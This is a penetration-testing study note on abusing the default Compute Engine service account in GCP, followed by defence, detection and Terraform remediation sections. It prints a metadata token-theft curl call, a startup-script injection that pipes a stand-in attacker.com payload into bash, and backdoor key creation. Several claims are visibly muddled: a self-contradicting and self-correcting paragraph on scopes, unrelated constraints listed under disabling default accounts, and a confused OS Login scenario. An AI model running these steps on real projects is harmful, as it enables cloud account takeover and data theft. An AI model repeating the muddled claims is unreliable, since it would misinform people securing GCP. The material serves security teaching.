---
tags: [cloud, gcp, compute-engine, privesc, default-accounts]
difficulty: intermediate
module: "37 - Cloud Infrastructure"
topic: "37.17 GCP Compute Engine"
---

# GCP Compute Engine — Default Service Account Abuse

Google Compute Engine (GCE) is the Infrastructure as a Service (IaaS) component of Google Cloud Platform, providing virtual machines (VMs). A critical security vulnerability in many GCP environments arises from the misunderstanding and misuse of **Default Service Accounts** attached to these instances. Abuse of these accounts provides attackers with one of the most reliable and straightforward paths to privilege escalation and widespread environmental compromise following an initial breach.

## 1. Architectural Deep Dive: What is a Default Service Account?

When a new GCP project is created, Google automatically provisions several default service accounts to facilitate immediate ease of use. The most dangerous of these is the **Compute Engine Default Service Account**.

*   **Format**: `[PROJECT_NUMBER]-compute@developer.gserviceaccount.com`
*   **Historical Privilege**: In older GCP projects (and until recently in new ones unless organizational policies prevented it), this account was automatically granted the **`Editor`** role on the entire project.

The `Editor` role is incredibly powerful. It allows the identity to create, modify, and delete almost any resource within the project, including reading data from Storage buckets, deploying new services, and modifying firewall rules.

When a user spins up a new Compute Engine VM via the Cloud Console without explicitly specifying a custom service account, GCP automatically attaches this Default Service Account to the VM.

### ASCII Architecture Diagram

```text
+-------------------------------------------------------------------------+
|                          GCP Project Boundary                           |
|                                                                         |
|  +-------------------------------------------------------------------+  |
|  | IAM Policy Binding                                                |  |
|  | - Identity: 123456789-compute@developer.gserviceaccount.com       |  |
|  | - Role: roles/editor (Full read/write on most resources)          |  |
|  +-------------------------------------------------------------------+  |
|                                     |                                   |
|                                     | Inherits Permissions              |
|                                     v                                   |
|  +===================================================================+  |
|  |                       Compute Engine VM                           |  |
|  |  Attached SA: 123456789-compute@developer.gserviceaccount.com     |  |
|  |                                                                   |  |
|  |  [Vulnerable Web App] <--- Attacker exploits RCE                  |  |
|  |          |                                                        |  |
|  |          v                                                        |  |
|  |  [Query Metadata Server] ---> Token for 123456789-compute@...     |  |
|  +===================================================================+  |
|                                     |                                   |
|   Attacker uses Token to Pivot      |                                   |
|                                     v                                   |
|  +-------------------+    +-------------------+    +-----------------+  |
|  |  Cloud Storage    |    |  Other Compute    |    |  SQL Databases  |  |
|  |  (Read/Write)     |    |  (Create/Destroy) |    |  (Access Data)  |  |
|  +-------------------+    +-------------------+    +-----------------+  |
+-------------------------------------------------------------------------+
```

## 2. The Scope Limitation Mechanism

Recognizing the extreme danger of attaching an `Editor` to every web server by default, Google implemented a mitigation known as **Access Scopes**.

Access Scopes are a legacy authorization mechanism that determines what API endpoints the VM is allowed to communicate with, *regardless of the IAM role attached*. When a VM is created with the default service account, it usually defaults to restricted scopes.

**Typical Default Restricted Scopes:**
*   Read-only access to Cloud Storage.
*   Write access to Cloud Logging and Cloud Monitoring.
*   Read/Write access to Service Control.
*   **NO** access to Compute Engine API (or read-only).

### The Security Illusion

Many administrators believe that because the VM has restricted scopes, the `Editor` role is neutralized. This is a dangerous misconception. **If an attacker can modify the VM's scopes, or if they can exfiltrate the token to a machine outside of GCP, they can bypass the scope restrictions entirely.** (Note: Scope enforcement is usually tied to the token itself, but the way attackers leverage identity can sometimes circumvent this if they escalate via other means).

Actually, the more precise vulnerability is: Access Scopes *do* restrict the token. If an attacker steals a token from a VM with restricted scopes, that token *is* restricted. **However**, if the attacker finds a way to force the VM to execute commands with a full-scope token, or if they find a VM that was configured with the "Allow full access to all Cloud APIs" (`https://www.googleapis.com/auth/cloud-platform`) scope, the `Editor` role is fully unleashed.

## 3. Exploitation Methodology

### Scenario A: The "Full Access" Misconfiguration

Developers frequently encounter "Permission Denied" errors when their application tries to talk to GCP services because of the default restricted scopes. The easiest (and most insecure) fix provided in the GCP Console is a radio button: **"Allow full access to all Cloud APIs"**.

If an attacker compromises a VM configured this way:

1.  **Extract Token**:
    ```bash
    curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    ```
2.  **Verify Scopes**:
    ```bash
    curl "https://oauth2.googleapis.com/tokeninfo?access_token=[TOKEN]"
    ```
    If `scope` includes `https://www.googleapis.com/auth/cloud-platform`, the token is unrestricted.
3.  **Total Compromise**:
    The attacker configures their local `gcloud` with the token. Because the underlying account is the Default Compute Service Account (which has `Editor`), they now effectively own the project. They can read all buckets, dump database snapshots, and create backdoored IAM users.

### Scenario B: Bypassing Restricted Scopes via `setMetadata`

If the attacker lands on a VM with restricted scopes, but the attached service account somehow has the `compute.instances.setMetadata` permission (perhaps granted via a custom role, or if they compromise a different service account with this right), they can escalate privileges without needing full scopes initially.

The attack path:
1.  The attacker cannot make direct broad API calls because of scope limits.
2.  However, they can update the metadata of *other* VMs in the project.
3.  They inject a malicious `startup-script` into the metadata of a highly privileged VM, or a VM with the `cloud-platform` scope.

**Injection Command:**
```bash
gcloud compute instances add-metadata target-high-priv-vm \
    --metadata startup-script="#!/bin/bash
    curl -s http://attacker.com/malware.sh | bash" \
    --zone us-central1-a
```

4.  The attacker then resets or stops/starts the `target-high-priv-vm`.
5.  When it boots, the `startup-script` executes as root on the target VM. The script steals the high-privileged, fully-scoped token from *that* machine and sends it to the attacker.

### Scenario C: Privilege Escalation via OS Login

If OS Login is enabled, but the attacker has `compute.instances.osLogin` (often included in standard roles), they can inject their own SSH keys into the project metadata. This grants them SSH access to virtually any other VM in the project, allowing them to hop from a restricted-scope VM to a full-scope VM.

## 4. Persistence Mechanisms

Once an attacker abuses the default service account, they will establish persistence to ensure access even if the original vulnerable VM is patched.

*   **Service Account Key Creation**: Using the `Editor` privileges, the attacker generates long-lived JSON keys for the Default Service Account.
    ```bash
    gcloud iam service-accounts keys create backdoor.json \
      --iam-account [PROJECT_NUMBER]-compute@developer.gserviceaccount.com
    ```
*   **IAM Backdoors**: Adding an external Gmail or Workspace account to the project with the `Owner` or `Editor` role.
*   **Startup Scripts**: Modifying project-wide metadata to include a reverse shell in the startup script, so every new VM created in the project automatically calls back to the attacker.

## 5. Defense and Remediation

Addressing Default Service Account abuse requires fundamental architectural changes.

1.  **Organizational Policies (The Silver Bullet)**: Enforce the Organization Policy Constraint: `constraints/iam.automaticIamGrantsForDefaultServiceAccounts`. Setting this to `True` prevents GCP from automatically granting the `Editor` role to default service accounts upon project creation.
2.  **Disable Default Service Account Creation**: Enforce the constraint `constraints/compute.disableGuestAttributesAccess` and `constraints/compute.requireOsLogin` to harden the environment, but more importantly, adopt a strict policy of never using default accounts.
3.  **Dedicated Custom Service Accounts**: Every VM should be assigned a custom service account created specifically for its workload.
4.  **Enforce Principle of Least Privilege**: The custom service account should only be granted the exact IAM roles needed (e.g., `roles/storage.objectViewer` on a specific bucket, rather than project-wide).
5.  **Audit Existing Deployments**: Run scripts across the GCP organization to identify VMs running with `[PROJECT_NUMBER]-compute@developer.gserviceaccount.com` and the `cloud-platform` scope. These are critical risks and should be rotated to custom accounts immediately.

## 6. Forensics and Detection

*   **Audit Logging**: Query Cloud Logging for operations authenticated by the Default Compute Service Account.
    *   Filter: `protoPayload.authenticationInfo.principalEmail=~".*-compute@developer.gserviceaccount.com"`
*   **Behavioral Anomaly**: Detect when a service account attached to a specific VM IP address is suddenly used from a completely different geographical location or from an anonymity network (Tor, VPNs).
*   **Metadata Modification Alerts**: Set up high-priority alerts for any `SetMetadata` API calls, especially those modifying the `startup-script` or `ssh-keys` keys.

## Chaining Opportunities

*   **[[15 - GCP Metadata Server — Credential Theft]]**: The necessary first step to acquire the token of the default service account.
*   **[[09 - IAM Privilege Escalation Fundamentals]]**: The theoretical foundation of why the `Editor` role allows such devastating lateral movement.
*   **[[22 - GCP Cloud Resource Manager Abuse]]**: Using the compromised Editor account to manipulate project boundaries or move laterally to billing accounts.

## Related Notes

*   [[16 - GCP Cloud Functions — Privilege Escalation]] - Similar issues regarding default identities in serverless environments.
*   [[03 - Cloud Initial Access Techniques]] - How attackers get onto the VM in the first place.

## Appendix C: Comprehensive Cloud Penetration Testing Methodology
When assessing cloud environments for default service account abuse and privilege escalation, standard network penetration testing methodologies fall short. The focus must shift to identity, metadata, and control plane interactions.

### Step 1: Reconnaissance & OSINT
*   Identify cloud provider footprint via ASN mapping and DNS enumeration.
*   Enumerate public storage buckets and exposed serverless functions.
*   Scrape GitHub and GitLab for accidentally committed service account keys or infrastructure-as-code (IaC) templates.

### Step 2: Initial Access & Foothold
*   Exploit traditional web vulnerabilities (SSRF, RCE, LFI) on exposed compute instances.
*   Phish internal developers for overly permissive tokens or CLI credentials.
*   Utilize compromised CI/CD pipelines as an entry point into the cloud fabric.

### Step 3: Local Enumeration & Metadata Extraction
*   Query the link-local metadata servers (`169.254.169.254`).
*   Extract instance identity tokens, project metadata, and user-data/startup scripts.
*   Analyze the local environment variables and hidden files (`.aws/credentials`, `gcloud/application_default_credentials.json`).

### Step 4: Lateral Movement & Privilege Escalation
*   Leverage stolen tokens to authenticate to the cloud provider's API.
*   Enumerate attached IAM policies, roles, and scopes.
*   Exploit misconfigurations (e.g., `iam.serviceAccounts.actAs` or missing scope limits) to jump to higher-privileged accounts or resources.

## Appendix D: Incident Response and Forensics Playbook
When a breach is suspected, responders must act quickly to contain the blast radius.

### Containment
1.  **Revoke Tokens**: Immediately revoke the stolen access tokens. In GCP, this may involve revoking the refresh tokens associated with the compromised service account.
2.  **Isolate the Instance**: Detach the compromised VM from the VPC network or apply a strict deny-all firewall rule, preserving the disk state for forensic imaging.
3.  **Rotate Keys**: Rotate any static access keys or secrets that were accessible from the compromised instance's environment.

### Investigation
1.  **Audit Logs**: Query Cloud Audit Logs for anomalous API calls originating from the compromised service account's token. Look for actions outside its normal baseline (e.g., a web server suddenly querying the Resource Manager API).
2.  **Network Flow**: Analyze VPC Flow Logs for unexpected outbound connections, particularly to known threat actor infrastructure or large data transfers indicating exfiltration.
3.  **Disk Forensics**: Image the instance's boot disk and analyze for dropped malware, modified startup scripts, or signs of lateral movement tooling.

## Appendix A: Advanced Escalation via OS Login and IAM

### Deep Dive: OS Login Misconfigurations
Google Cloud's OS Login feature is designed to replace traditional SSH key management. Instead of distributing SSH keys, users authenticate via IAM and their Google identities. However, if an attacker compromises a Default Service Account with standard privileges (e.g., `compute.instances.osLogin` or `compute.instances.osAdminLogin`), they can manipulate this system.

When an attacker possesses a token with OS Login capabilities, they can utilize the `gcloud compute os-login ssh-keys add` command. This effectively injects the attacker's public key into the target user's Google Account profile. Once injected, the attacker can SSH into ANY Compute Engine instance within the organization that is configured to use OS Login, completely bypassing perimeter firewalls (if Identity-Aware Proxy is enabled) and traditional access controls.

### The Role of IAP (Identity-Aware Proxy)
Identity-Aware Proxy (IAP) allows for zero-trust access to GCP VMs without requiring public IP addresses. Attackers frequently use IAP for stealthy lateral movement.
Command to tunnel SSH via IAP using a stolen token:
`gcloud compute ssh target-vm --tunnel-through-iap --zone us-central1-a`

## Appendix B: Remediation via Terraform

To programmatically prevent the creation of Default Service Accounts with the Editor role, organizations should enforce the following Organization Policy using Terraform:

```hcl
resource "google_organization_policy" "disable_automatic_iam_grants" {
  org_id     = var.organization_id
  constraint = "constraints/iam.automaticIamGrantsForDefaultServiceAccounts"

  boolean_policy {
    enforced = true
  }
}

resource "google_organization_policy" "require_os_login" {
  org_id     = var.organization_id
  constraint = "constraints/compute.requireOsLogin"

  boolean_policy {
    enforced = true
  }
}
```
Enforcing these constraints at the organization level ensures that no individual project owner can accidentally revert to the insecure default behavior.
